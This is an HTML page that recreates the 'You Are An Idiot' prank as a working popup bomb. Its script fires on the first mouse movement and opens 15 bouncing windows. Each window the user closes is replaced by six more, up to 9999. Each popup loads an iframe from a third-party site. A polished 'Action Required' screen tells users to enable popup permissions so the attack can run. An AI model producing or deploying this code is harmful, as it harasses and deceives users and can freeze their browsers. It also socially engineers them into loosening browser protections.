<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>You Are An Idiot</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-image: url('https://upload.wikimedia.org/wikipedia/commons/5/5c/You_Are_An_Idiot_screen.gif');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            height: 100vh;
            width: 100vw;
            overflow: hidden;
            cursor: pointer;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        /* Professional error screen styling */
        #error-screen {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #f4f4f7;
            color: #333;
            z-index: 9999;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            padding: 20px;
        }

        .error-container {
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
            max-width: 500px;
        }

        .icon {
            font-size: 48px;
            margin-bottom: 20px;
        }

        h1 {
            margin: 0 0 10px 0;
            font-size: 24px;
            color: #1a1a1a;
        }

        p {
            margin: 0 0 25px 0;
            line-height: 1.6;
            color: #666;
        }

        .btn {
            background: #007bff;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 16px;
            border-radius: 6px;
            cursor: pointer;
            text-decoration: none;
            transition: background 0.2s;
        }

        .btn:hover {
            background: #0056b3;
        }
    </style>
</head>
<body>

    <div id="error-screen">
        <div class="error-container">
            <div class="icon">🚀</div>
            <h1>Action Required</h1>
            <p>To provide the intended experience, this application requires popup permissions. Please enable popups in your browser settings and refresh the page.</p>
            <button class="btn" onclick="location.reload()">I've enabled them, reload</button>
        </div>
    </div>

    <script>
        const popups = [];
        const INITIAL_BATCH = 15;
        const RESPAWN_COUNT = 6;
        const MAX_TOTAL_POPUPS = 9999; 
        const winWidth = 350;
        const winHeight = 300;
        const dogImgUrl = "https://upload.wikimedia.org/wikipedia/commons/5/5c/You_Are_An_Idiot_screen.gif";

        /**
         * Spawns a single popup window and returns it.
         */
        window.spawnPopup = function() {
            if (popups.length >= MAX_TOTAL_POPUPS) return null;

            const startX = Math.random() * (window.screen.availWidth - winWidth);
            const startY = Math.random() * (window.screen.availHeight - winHeight);
            
            const vX = (Math.random() > 0.5 ? 1 : -1) * (4 + Math.random() * 6);
            const vY = (Math.random() > 0.5 ? 1 : -1) * (4 + Math.random() * 6);

            const winName = `dogWin_${Math.random().toString(36).substr(2, 9)}`;
            const newWin = window.open('about:blank', winName, `width=${winWidth},height=${winHeight},left=${startX},top=${startY},menubar=no,status=no,toolbar=no`);

            if (newWin) {
                newWin.document.write(`
                    
                    <title>You Are An Idiot</title>
                    <iframe src="v-sites4u.github.io/youdontknowwhoiam"></iframe>
                   
                `);

                popups.push({
                    win: newWin,
                    posX: startX,
                    posY: startY,
                    velX: vX,
                    velY: vY
                });
                return newWin;
            }
            return null;
        };

        /**
         * Spawns a batch of windows using the chain method.
         */
        window.spawnBatch = function(count) {
            let spawned = 0;
            const chain = () => {
                if (spawned < count && popups.length < MAX_TOTAL_POPUPS) {
                    const win = window.spawnPopup();
                    if (win) {
                        spawned++;
                        setTimeout(chain, 50);
                    } else if (popups.length === 0) {
                        // If the very first window fails to open, show the professional error screen
                        showPopupError();
                    }
                }
            };
            chain();
        };

        /**
         * Displays the professional fallback screen.
         */
        function showPopupError() {
            document.getElementById('error-screen').style.display = 'flex';
            document.body.style.backgroundImage = 'none';
            document.body.style.backgroundColor = '#f4f4f7';
        }

        function animate() {
            const screenW = window.screen.availWidth;
            const screenH = window.screen.availHeight;

            for (let i = popups.length - 1; i >= 0; i--) {
                const p = popups[i];

                if (!p.win || p.win.closed) {
                    popups.splice(i, 1);
                    window.spawnBatch(RESPAWN_COUNT);
                    continue;
                }

                p.posX += p.velX;
                p.posY += p.velY;

                if (p.posX + winWidth >= screenW || p.posX <= 0) p.velX *= -1;
                if (p.posY + winHeight >= screenH || p.posY <= 0) p.velY *= -1;

                try {
                    p.win.moveTo(p.posX, p.posY);
                } catch (e) {}
            }
            requestAnimationFrame(animate);
        }

        const handleInteraction = () => {
            if (popups.length === 0) {
                window.spawnBatch(INITIAL_BATCH);
            }
            window.removeEventListener('mousemove', handleInteraction);
        };

        window.addEventListener('mousemove', handleInteraction);

        window.onbeforeunload = () => {
            popups.forEach(p => {
                if (p.win && !p.win.closed) p.win.close();
            });
        };

        requestAnimationFrame(animate);
    </script>
</body>
</html>
